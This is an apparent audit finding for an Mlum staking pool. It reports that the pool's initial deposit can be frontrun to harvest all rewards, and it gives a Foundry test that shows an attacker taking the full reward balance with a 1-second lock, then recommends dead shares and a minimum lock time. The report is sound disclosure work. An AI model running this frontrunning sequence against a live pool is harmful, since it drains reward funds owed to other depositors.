# Initial Mlum pool user deposits can be frontrun to extract all the rewards

## Summary
The initial deposit can be frontrun extracting all of the rewards.

## Vulnerability Detail
A malicious user can frontrun the initial deposit, immediately harvesting and extracting all the rewards and even being able to set the lockTime as 1 second for minimized risk.

## Impact
High - Complete draining of reward funds.

## Code Snippet
This test can be added to the ```MlumStaking.t.sol``` test file.
```solidity
function testFrontRunAttack() public {
        _stakingToken.mint(ALICE, 2 ether);
        _stakingToken.mint(BOB, 2 ether);

        _rewardToken.mint(address(_pool), 100_000_000);
        
        vm.startPrank(ALICE); // ALICE frontruns BOBs transaction to get all the rewards
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 1);
        _pool.harvestPosition(1);
        vm.stopPrank();

        vm.startPrank(BOB);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether, 365 days);
        vm.stopPrank();

        skip(1);
        vm.prank(ALICE); // ALICE can then withdraw 1 second later
        _pool.withdrawFromPosition(1, 1 ether);

        vm.prank(BOB);
        _pool.harvestPosition(2);

        console.log(_rewardToken.balanceOf(ALICE)); // 100_000_000
        console.log(_rewardToken.balanceOf(BOB)); // 0
    }
```
## Tool used
Foundry tests

## Recommendation
Use mitigation strategies similar to those used for a ERC4626 Vault inflation attack, such as dead shares (initial contract deposit on deployment). And setting a minimum locking time can discourage bad behaivour.
